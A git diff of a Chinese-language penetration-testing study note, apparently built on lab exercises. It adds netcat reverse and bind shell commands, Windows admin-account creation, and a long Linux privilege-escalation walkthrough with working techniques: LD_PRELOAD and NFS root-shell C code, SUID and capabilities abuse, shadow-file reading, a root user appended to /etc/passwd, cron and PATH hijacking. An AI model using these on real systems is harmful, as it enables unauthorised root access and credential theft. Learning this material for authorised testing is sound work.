@@ -373,12 +373,21 @@ socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sa
 监听，创建一个命名管道 /tmp/f，通过管道将 Netcat 的输出传给 /bin/sh，再将 Shell 的执行结果传回 Netcat，从而形成一个闭环：
 
 ```
+# 监听
 mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+
+# 连接
+nc <IP> <PORT>
 ```
 
-连接，逻辑与正向 Shell 几乎一致，只是将 Netcat 的语法从“监听模式”改为“连接模式”。
+![](/assets/images/20260512/mkfifo-1.png)
+
 
 ```
+# 监听
+nc -lvnp 4444
+
+# 连接
 mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
 ```
 
@@ -426,7 +435,515 @@ Windows 的方法相对受限，但思路一致：
 
 - 挖掘注册表/文件中的密码：VNC 服务器常在注册表中存储明文密码。FileZilla FTP Server 的配置文件（如 FileZilla Server.xml）中可能存有明文或 MD5 加密的凭据。
 - 添加管理员账户（前提是已获得 SYSTEM 或高权限管理员 Shell）：
-    - 创建用户：net user <username> <password> /add
-    - 提升为管理员：net localgroup administrators <username> /add
+    - 创建用户：`net user <username> <password> /add`
+    - 提升为管理员：`net localgroup administrators <username> /add`
 
 在实战中要特别注意，执行 net user /add 这种操作在有安全防护（EDR/杀毒软件）的环境中极其容易被触发告警。在进行这类操作前，通常需要先确认对方是否有监控。
+
+## Linux提权
+
+### 信息枚举
+
+信息枚举是你获取任意系统访问权限后必须执行的第一步。你可能是通过利用高危漏洞拿到了系统最高管理员权限，也可能只是找到了借助低权限账户执行命令的方法。与CTF靶机不同，渗透测试项目并不会在你获取特定系统权限或用户权限等级后就结束。你将会发现，信息枚举在系统攻陷后的阶段和攻陷之前同样重要。
+
+#### hostname
+
+hostname 命令会返回目标机器的主机名。尽管该值可以被轻易修改，也可能是一串无实际意义的字符（例如：Ubuntu-3487340239），但在部分场景下，它能够透露目标系统在企业网络中的角色信息（例如：SQL-PROD-01 代表生产环境 SQL 服务器）。
+
+#### uname -a
+
+会打印系统信息，为我们提供系统所使用内核的更多详细信息。这对于排查可能导致权限提升的各类潜在内核漏洞十分有用。
+
+#### /proc/version
+
+进程文件系统（procfs）可提供目标系统进程的相关信息。众多不同版本的 Linux 系统中都自带 proc 文件系统，是运维和渗透工作中必备的实用工具。
+
+查看 /proc/version 文件可以获取内核版本信息以及其他附加数据，例如系统是否安装了 GCC 等编译器。
+
+#### /etc/issue
+
+也可通过查看 /etc/issue 文件来识别系统。该文件通常包含一些操作系统相关信息，但可以被轻易自定义或修改。顺带一提，任何包含系统信息的文件都能够被自定义或篡改。若要更清晰地了解系统情况，逐一查看所有这类文件始终是稳妥的做法。
+
+#### ps
+
+ps 命令是查看 Linux 系统中正在运行进程的有效方式。在终端中输入 ps，即可显示**当前终端会话**的进程。ps（进程状态）命令的输出会包含以下内容：
+
+- PID：进程标识符（每个进程唯一）
+- TTY：用户所使用的终端类型
+- Time：进程占用的 CPU 时长（并非进程已运行的时间）
+- CMD：正在运行的命令或可执行程序（不会显示任何命令行参数）
+
+```
+$ ps
+  PID TTY          TIME CMD
+ 1702 pts/4    00:00:00 sh
+ 1848 pts/4    00:00:00 ps
+```
+
+Linux 中 ps 命令的一个历史“大坑”：它同时支持 UNIX 风格（带短横线 -）和 BSD 风格（不带短横线）。常用的`ps -ef`和`ps aux`就分别是unix风格和bsd风格，作用是等价的，都是列出所有进程（`-e或ax`），`-f`和`u`都是用于展示更多列。
+
+ps 命令选项：
+
+- `ps -A`或`ps -e`：两者等价，查看系统所有用户运行的所有进程
+- `ps axjf`：查看进程树
+    - a：显示所有前台进程
+    - x：显示所有后台进程
+    - j：采用任务控制格式（Jobs format）。这是最核心的部分，它会列出 PPID（父进程 ID）、PGID（进程组 ID）和 SID（会话 ID）。
+    - f：采用 ASCII 艺术风格的树状结构（Forest） 显示进程间的父子派生关系。
+- `ps aux`：aux 选项会展示所有用户的进程（a）、显示启动进程的所属用户（u），以及列出未关联终端的进程（x）。通过查看 ps aux 命令的输出结果，我们可以更好地了解系统状况以及潜在的安全漏洞。
+
+#### env
+
+env 命令将显示环境变量。
+
+环境变量 PATH 中可能包含编译器或脚本语言（例如 Python），可用于在目标系统上执行代码，或被利用来进行权限提升。
+
+#### sudo -l
+
+目标系统可能已配置为允许用户以 root 权限运行部分（或全部）命令。可使用 sudo -l 命令列出当前用户能够通过 sudo 执行的所有命令。
+
+#### ls
+
+Linux 中常用的命令之一当属 ls 命令。
+
+在寻找潜在的提权路径时，请务必记得始终使用带 -la 参数的 ls 命令。下方示例将演示，仅使用 ls 命令或 ls -l 命令时，很容易忽略掉 secret.txt 这类文件。
+
+#### id
+
+id 命令可以整体查看当前用户的权限级别以及所属用户组信息。
+
+值得注意的是，id 命令也可用于查看其他用户的信息，比如`id root`。
+
+#### /etc/passwd
+
+用于发现系统用户：
+
+```
+karen@wade7363:/$ cat /etc/passwd | cut -d ":" -f 1
+root
+daemon
+bin
+sys
+sync
+games
+man
+```
+
+请记住，该操作会返回所有用户，其中部分为系统用户或服务用户，参考价值并不大。另一种可行方法是使用 grep 命令检索 “home” 相关内容，因为真实用户的个人目录大概率都存放在 home 目录下：
+
+```
+karen@wade7363:/$ cat /etc/passwd | grep home
+syslog:x:101:104::/home/syslog:/bin/false
+usbmux:x:103:46:usbmux daemon,,,:/home/usbmux:/bin/false
+saned:x:108:115::/home/saned:/bin/false
+matt:x:1000:1000:matt,,,:/home/matt:/bin/bash
+karen:x:1001:1001::/home/karen:
+```
+
+#### history
+
+使用 history 命令查看历史执行过的命令，能够让我们对目标系统有一定了解，且极少数情况下还可能留存有密码、用户名这类敏感信息。
+
+#### ifconfig
+
+ifconfig 命令可以为我们提供该系统网络接口的相关信息。比如显示目标系统拥有三个接口（eth0、tun0 和 tun1）。我们的攻击机可以访问 eth0 接口，但无法直接接入另外两个网络。
+
+那么目标系统可能可以作为通往其他网络的跳板。可以结合`ip route`命令确认。
+
+#### netstat
+
+在初步检查现有网络接口和网络路由后，有必要进一步查看当前的通信连接状态。可以搭配多个不同参数使用 netstat 命令，以此采集现有网络连接的相关信息。
+
+- `netstat -a`：显示所有监听端口以及已建立的网络连接，如果不加-a，则仅提供活跃传输链路视图。
+- `netstat -at` 或 `netstat -au` 可分别用于列出 TCP 协议或 UDP 协议的相关连接。
+- `netstat -l`：列出处于 “监听” 状态的端口。这类端口已开放，可接收外部接入连接。该命令可搭配参数 t 使用，仅列出基于 TCP 协议进行监听的端口
+- `netstat -s`：按协议列出网络使用统计信息。该命令也可搭配 -t 或 -u 参数，将输出结果限定为指定协议。
+- `netstat -p`：列出带有服务名称和进程 ID 信息的连接，也可搭配-t -u -l参数。如果看到 “PID/Program name” 列为空，表示该进程由其他用户拥有。
+- `netstat -i`：显示网络接口统计信息。
+
+#### find
+
+以下是 find 命令的一些实用示例。
+
+- `find . -name flag1.txt`：在当前目录下查找名为 “flag1.txt” 的文件
+- `find /home -name flag1.txt`：在 /home 目录下查找名为 “flag1.txt” 的文件
+- `find / -type d -name config`：在根目录 “/” 下查找名为 config 的目录
+- `find / -type f -perm 0777`：查找权限为 777 的文件（所有用户均可读取、写入和执行的文件）
+- `find / -perm a=x`：查找可执行文件
+- `find /home -user frank`：在 /home 目录下查找所有者为用户 “frank” 的所有文件
+- `find / -mtime 10`：查找近 10 天内修改过的文件
+- `find / -atime 10`：查找近 10 天内被访问过的文件
+- `find / -cmin -60`：查找一小时（60 分钟）内属性发生变更的文件
+- `find / -amin -60`：查找一小时（60 分钟）内被访问过的文件
+- `find / -size 50M`：查找大小为 50 兆字节的文件
+- `find / -size +50M`：查找大于 50 兆字节的文件
+- `find / -size -50M`：查找小于 50 兆字节的文件
+- `find / -size +50M -type f 2>/dev/null`：查找大于 50 兆字节的文件，不打印错误信息
+
+寻找全局可写的目录：
+
+- `find / -writable -type d 2>/dev/null`：基于当前执行命令的用户权限来判断
+- `find / -perm -222 -type d 2>/dev/null`：这里的横杠 - 表示“至少包含”这些位。222 对应的是 w-w-w-（属主、属组、其他人都有写权限）。
+- `find / -perm -o w -type d 2>/dev/null`：-o w表示 "Others" 拥有 "Write" 权限。
+- `find / -perm -o x -type d 2>/dev/null`：寻找那些“其他人”可以 CD（进入） 进去的目录。在 Linux 中，目录的执行权限 x 代表“搜索权限”，即能否访问该目录下的文件。如果一个目录可执行但不可读，你虽然不能 ls 看到列表，但如果你知道文件名，你依然可以对其进行操作。
+
+查找开发工具及支持的编程语言：
+
+- `find / -name perl*`
+- `find / -name python*`
+- `find / -name gcc*`
+
+以下是一个用于查找设置了 SUID 权限位文件的简短示例。SUID 权限位可让文件以其所属用户账号的权限级别运行，而非以执行该文件的用户账号权限运行。这会形成一条可利用的权限提升路径。
+
+`find /-perm -u=s -type f 2>/dev/null`：查找设置了 SUID 权限位的文件，该权限可让我们以高于当前用户的权限级别运行文件。
+
+#### 自动枚举工具
+
+有多款工具能够帮你在信息搜集过程中节省时间。使用这类工具仅可作为省时手段，需知晓它们可能会遗漏部分权限提升路径。以下是常用的 Linux 信息搜集工具列表，并附带各自的 GitHub 仓库链接。
+
+目标系统的环境会决定你能够使用哪些工具。例如，若目标系统未安装 Python，你就无法运行基于 Python 编写的工具。因此，熟练掌握多款工具，远比只依赖某一款固定工具要好。
+
+- LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS(opens in new tab)
+- LinEnum: https://github.com/rebootuser/LinEnum(opens in new tab)(opens in new tab)
+- LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester(opens in new tab)
+- Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration(opens in new tab)
+- Linux Priv Checker: https://github.com/linted/linuxprivchecker
+
+### 内核漏洞利用
+
+Linux的内核权限很高，如果能利用内核漏洞，就能取得root权限。
+
+- 确定内核版本
+- 搜索并查找适配目标系统内核版本的漏洞利用代码
+- 运行漏洞利用程序
+
+虽然步骤看上去简单，但是一旦内核漏洞利用失败，可能导致系统崩溃，因此在真正实施前务必确保能承受此后果。
+
+研究来源：
+
+- 根据你的发现，可通过谷歌搜索现有的漏洞利用代码。
+- 诸如 https://www.cvedetails.com/这类网站也能提供帮助。
+- 另一种方法是使用LES这类自动枚举工具，但需注意，此类工具可能产生误报（报告不影响目标系统的内核漏洞）或漏报（内核存在漏洞却未检测出）。
+
+注意事项：
+
+- 在谷歌、漏洞数据库 Exploit-db 或漏洞搜索工具 searchsploit 上搜索漏洞利用程序时，不要把内核版本限定得过于具体。
+- 在运行漏洞利用代码前，务必理解其工作原理。部分漏洞利用代码会对操作系统做出修改，导致系统后续使用存在安全隐患，或是对系统造成不可逆改动，进而引发后续各类问题。当然，在实验环境或 CTF 夺旗赛场景中这类问题影响不大，但在真实的渗透测试项目中，这是绝对禁止的行为。
+- 部分漏洞利用程序运行后需要进行后续交互操作，请仔细阅读漏洞利用代码附带的所有注释与使用说明。
+- 你可以分别借助 Python 的 SimpleHTTPServer 模块和 wget 工具，将漏洞利用代码从本机传输至目标系统。
+
+```
+karen@wade7363:/$ uname -a
+Linux wade7363 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
+karen@wade7363:/$ cat /proc/version
+Linux version 3.13.0-24-generic (buildd@panlong) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014
+karen@wade7363:/$ cat /etc/issue
+Ubuntu 14.04 LTS \n \l
+
+
+root@ip-10-49-112-244:~# searchsploit ubuntu 14.04 3.13
+--------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                     |  Path
+--------------------------------------------------------------------------------------------------- ---------------------------------
+Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalati | linux/local/37292.c
+Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalati | linux/local/37293.txt
+Linux Kernel 3.4 < 3.13.2 (Ubuntu 13.04/13.10 x64) - 'CONFIG_X86_X32=y' Local Privilege Escalation | linux_x86-64/local/31347.c
+Linux Kernel 3.4 < 3.13.2 (Ubuntu 13.10) - 'CONFIG_X86_X32' Arbitrary Write (2)                    | linux/local/31346.c
+Linux Kernel 4.10.5 / < 4.14.3 (Ubuntu) - DCCP Socket Use-After-Free                               | linux/dos/43234.c
+Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                      | linux/local/45010.c
+Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                             | linux/local/44298.c
+Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Privilege Escalation  | linux_x86-64/local/44300.c
+Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SM | linux/local/43418.c
+Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privilege Es | linux/local/47169.c
+Ubuntu < 15.10 - PT Chown Arbitrary PTs Access Via User Namespace Privilege Escalation             | linux/local/41760.txt
+--------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+root@ip-10-49-112-244:~# searchsploit -m linux/local/37292.c
+  Exploit: Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation
+      URL: https://www.exploit-db.com/exploits/37292
+     Path: /opt/exploitdb/exploits/linux/local/37292.c
+    Codes: CVE-2015-1328
+ Verified: True
+File Type: C source, ASCII text, with very long lines
+Copied to: /root/37292.c
+```
+
+### sudo
+
+sudo 命令默认允许你以 root 权限运行程序。在某些情况下，系统管理员需要为普通用户提供一定的权限灵活性。例如，初级安全运营中心分析师可能需要经常使用 Nmap，但无权获得完整的 root 访问权限。此时，系统管理员可以仅允许该用户以 root 权限运行 Nmap，而在系统其他操作中保持其普通权限级别。
+
+任何用户都可以使用 sudo -l 命令查看自身当前与 root 权限相关的配置情况。
+
+https://gtfobins.github.io/ 这是一个专门整理 Unix/Linux 系统内置命令如何被滥用来绕过限制或提权的“黑魔法”速查手册。
+
+比如如果某个普通用户被配置为允许执行sudo nmap，就可以利用`sudo nmap --interactive`获取一个root权限的shell。
+
+#### 利用应用程序功能
+
+在此场景下，部分应用程序暂无已知漏洞可利用，Apache2 服务器就是典型例子。
+
+这种情况下，我们可以借助应用程序自身的某项功能，采用一种非常规手段来窃取信息。比如 Apache2 提供了加载备用配置文件的参数选项（-f：指定备用服务器配置文件）。
+
+使用该选项加载 /etc/shadow 文件会触发报错信息，报错内容中会包含 /etc/shadow 文件的首行内容。
+
+#### 利用LD_PRELOAD机制
+
+1. 核心概念：什么是 LD_PRELOAD？
+
+LD_PRELOAD 是 Linux 系统中的一个环境变量，它允许程序在启动时优先加载指定的共享库（.so 文件）。这意味着攻击者可以编写自定义函数来“劫持”或替换系统标准的库函数，从而在程序运行前执行恶意代码。
+
+2. 利用的前提条件
+
+要成功利用此漏洞，必须满足以下条件：
+
+Sudo 配置漏洞：通过 sudo -l 查看时，发现 env_keep 选项中包含 LD_PRELOAD。这意味着当你使用 sudo 执行命令时，系统会保留并信任你设置的该环境变量。
+
+用户权限：当前用户至少拥有以 sudo 运行某个程序的权限（例如 find、vim 等）。
+
+![](/assets/images/20260512/sudo.png)
+
+3. 攻击步骤详解
+
+整个提权过程分为四步：
+
+第一步：检查环境
+
+执行 sudo -l。如果在输出的 Matching Defaults 中看到 env_keep += LD_PRELOAD，说明系统存在此配置风险。
+
+第二步：编写恶意 C 代码
+
+编写一个简单的 C 程序（如 shell.c），利用 _init() 函数（该函数会在库加载时立即执行）。代码核心功能是设置用户 ID 为 0（Root）并启动 /bin/bash。
+
+```c
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+unsetenv("LD_PRELOAD");
+setgid(0);
+setuid(0);
+system("/bin/bash");
+}
+```
+
+第三步：编译为共享对象
+
+使用 gcc 将代码编译成共享库文件（.so）：gcc -fPIC -shared -o shell.so shell.c -nostartfiles。
+
+第四步：触发提权
+
+行任意你有 sudo 权限的程序，并在启动时手动指定 LD_PRELOAD 指向你的恶意库：sudo LD_PRELOAD=/home/user/ldpreload/shell.so <任意sudo程序>。
+
+![](/assets/images/20260512/ld-preload.png)
+
+### suid
+
+SUID（设置用户标识）和 SGID（设置组标识）是 Linux 中特殊的权限位，它们允许用户以文件所有者或属组的身份执行某个程序，而不是以当前登录用户的身份。在多用户系统中，这通常用于让普通用户安全地执行某些需要高权限的任务（比如修改自己的密码）。
+
+这里的/usr/bin/passwd就是设置了suid，如果是`-rwsr-sr-x`则也设置了sgid。
+
+```
+$ ls -l /usr/bin/passwd
+-rwsr-xr-x 1 root root 68208 May 28  2020 /usr/bin/passwd
+```
+
+因为/etc/shadow只有root才能写，所以普通用户执行passwd命令需要以root身份执行。
+
+`find / -type f -perm -04000 -ls 2>/dev/null`命令可以找到所有设置了suid或sgid的文件。
+
+一个良好的实践是，将此列表中的可执行文件与 [GTFOBins](https://gtfobins.github.io) 进行比对。点击 SUID 按钮即可筛选出已知在设置 SUID 位时可被利用的二进制程序（你也可以通过此链接直接获取预筛选列表：https://gtfobins.github.io/#+suid）。
+
+```
+karen@ip-10-49-149-159:/$ find / -type f -perm -04000 -ls 2>/dev/null | grep base64
+    1722     44 -rwsr-xr-x   1 root     root               43352 Sep  5  2019 /usr/bin/base64
+karen@ip-10-49-149-159:/$ cat /home/ubuntu/flag3.txt
+cat: /home/ubuntu/flag3.txt: Permission denied
+karen@ip-10-49-149-159:/$ base64 /home/ubuntu/flag3.txt | base64 -d
+THM-3847834
+```
+
+假设nano命令被设置了suid，但GTFOBins并未提供直接可用的利用方法。在此阶段，我们有两种权限提升的基础方式：读取 /etc/shadow 文件，或将当前用户添加至 /etc/passwd 文件中。以下是利用两种攻击途径的简易操作步骤：
+
+- 读取 /etc/shadow 文件
+    - 执行 find /-type f -perm -04000 -ls 2>/dev/null 命令，可以查看到 nano 文本编辑器已设置 SUID 权限位。
+    - 执行 nano /etc/shadow 命令即可查看 /etc/shadow 文件的内容。此时可借助 unshadow 工具生成能够被John the Ripper破解的文件。要完成该操作，unshadow 需要同时读取 /etc/shadow 和 /etc/passwd 两个文件（`unshadow passwd.txt shadow.txt > passwords.txt`）。
+- 另一种方法是添加一个拥有 root 权限的新用户
+    - 我们需要获取为新用户设置的密码的哈希值，在 Kali Linux 系统中使用 openssl 工具即可快速生成（`openssl passwd -1 -salt THM password1`）
+    - 随后我们将把该密码与用户名一同添加到 /etc/passwd 文件中（使用nano编辑完成等效操作`echo hacker:<passwd>:0:0:root:/root:/bin/bash >> /etc/password`）
+
+### Capabilities
+
+Capabilities能够以更细的粒度对权限进行管控。
+
+例如，安全运营中心分析师需要使用一款需要发起套接字连接的工具，普通用户默认无法执行该操作。如果系统管理员不想为该用户授予更高的系统权限，就可以修改对应二进制文件的能力配置。配置完成后，该二进制程序无需高权限用户身份，即可正常完成自身任务。
+
+我们可以使用 getcap 工具查看已启用的能力权限。
+
+```
+karen@ip-10-49-188-239:~$ getcap -r / 2>/dev/null
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/bin/ping = cap_net_raw+ep
+/home/karen/vim = cap_setuid+ep
+/home/ubuntu/view = cap_setuid+ep
+```
+
+比如这里的ping，需要收发icmp，正是因为有了net_raw能力，才能让普通用户在无suid/sgid的情况下执行ping命令。
+
+https://gtfobins.org/#//^capabilities$ 上可以找到利用capabilities的提权方式。
+
+通过vim的setuid能力，可以获取到一个root权限的shell：
+
+```
+./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+```
+
+### cron jobs
+
+原理十分简单：如果存在一项以 root 权限执行的计划任务，且我们能够修改该任务将要运行的脚本，那么我们植入的脚本就会以 root 权限执行。
+
+系统中的每个用户都拥有专属的计划任务文件，无论用户是否处于登录状态，都可以执行设定好的特定任务。可想而知，我们的目标就是找到由 root 用户设置的定时任务，利用它来运行我们的脚本，最好是交互式 Shell 脚本。
+
+任何用户都可以读取存放系统级定时任务的 /etc/crontab 文件。夺旗赛靶机中的定时任务可能每分钟或每五分钟执行一次，而在渗透测试实战中，你更常见到按日、周、月周期运行的任务。
+
+```
+karen@ip-10-48-168-59:~$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+* * * * *  root /antivirus.sh
+* * * * *  root antivirus.sh
+* * * * *  root /home/karen/backup.sh
+* * * * *  root /tmp/test.py
+```
+
+如果没有指定脚本的完整路径，定时任务会按照 /etc/crontab 文件中 PATH 环境变量所列出的路径进行查找。
+
+### PATH
+
+如果PATH中存在当前用户拥有写入权限的文件夹，就有可能劫持应用程序来执行恶意脚本。Linux 中的 PATH 是一个环境变量，用于告知操作系统可执行文件的查找位置。对于非 Shell 内置、也未通过绝对路径指定的任意命令，Linux 会从 PATH 所定义的文件夹中依次进行查找。（此处大写 PATH 指环境变量，小写 path 指文件所在路径）。
+
+```
+# 找到所有可写的目录，仅提取一层
+karen@ip-10-48-189-238:/$ find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u
+dev
+etc
+home
+proc
+run
+snap
+sys
+tmp
+usr
+var
+# 对比PATH
+karen@ip-10-48-189-238:/$ echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+# 继续找/usr下可写目录
+karen@ip-10-48-189-238:/$ find /usr -writable 2>/dev/null | cut -d "/" -f 2,3 | sort -u
+usr/lib
+# 继续找/snap下可写目录
+karen@ip-10-48-189-238:/$ find /snap -writable 2>/dev/null | cut -d "/" -f 2,3 | sort -u
+snap/core
+snap/core18
+snap/core20
+
+# 没有可利用的path，找有suid的可执行文件
+karen@ip-10-48-189-238:/$ find / -type f -perm -04000 -ls 2>/dev/null | grep /home/murdoch/test
+   256346     20 -rwsr-xr-x   1 root     root               16712 Jun 20  2021 /home/murdoch/test
+# 尝试执行发现在执行thm文件
+karen@ip-10-48-189-238:/$ /home/murdoch/test
+sh: 1: thm: not found
+
+# 修改当前用户PATH
+export PATH=$PATH:/home/murdoch
+# PATH劫持
+echo "cat /home/matt/flag6.txt" > /home/murdoch/thm
+chmod +x /home/murdoch/thm
+```
+
+### NFS
+
+这个是NFS的配置文件，目标机器有三个共享目录：
+
+```
+karen@ip-10-49-164-182:/$ cat /etc/exports
+# /etc/exports: the access control list for filesystems which may be exported
+#               to NFS clients.  See exports(5).
+#
+# Example for NFSv2 and NFSv3:
+# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
+#
+# Example for NFSv4:
+# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
+# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
+#
+/home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)
+/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
+/home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)
+```
+
+`no_root_squash`表示，远程主机的 root 用户在挂载该目录后，在该目录内依然拥有真正的 root 权限。
+
+攻击机上查询目标机器已导出的目录：
+
+```
+root@ip-10-49-64-126:~# showmount -e 10.49.164.182
+Export list for 10.49.164.182:
+/home/ubuntu/sharedfolder *
+/tmp                      *
+/home/backup              *
+```
+
+将目录挂载到本地：
+
+```
+root@ip-10-49-64-126:~# mkdir /mnt/target
+root@ip-10-49-64-126:~# mount -o rw 10.49.164.182:/tmp /mnt/target
+```
+
+写一个带suid的shell程序：
+
+```
+root@ip-10-49-64-126:/mnt/target# pwd
+/mnt/target
+root@ip-10-49-64-126:/mnt/target# cat nfs.c
+int main() {
+        setgid(0);
+        setuid(0);
+        system("/bin/bash");
+        return 0;
+}
+root@ip-10-49-64-126:/mnt/target# gcc nfs.c -o nfs -w
+root@ip-10-49-64-126:/mnt/target# chmod +s nfs
+root@ip-10-49-64-126:/mnt/target# ls -l nfs
+-rwsr-sr-x 1 root root 16784 May 14 07:10 nfs
+root@ip-10-49-64-126:/mnt/target#
+
+# 到目标机器上，执行即可获得root shell
+karen@ip-10-49-164-182:/tmp$ ./nfs
+root@ip-10-49-164-182:/tmp# cat /home/matt/flag7.txt
+THM-89384012
+root@ip-10-49-164-182:/tmp#
+```
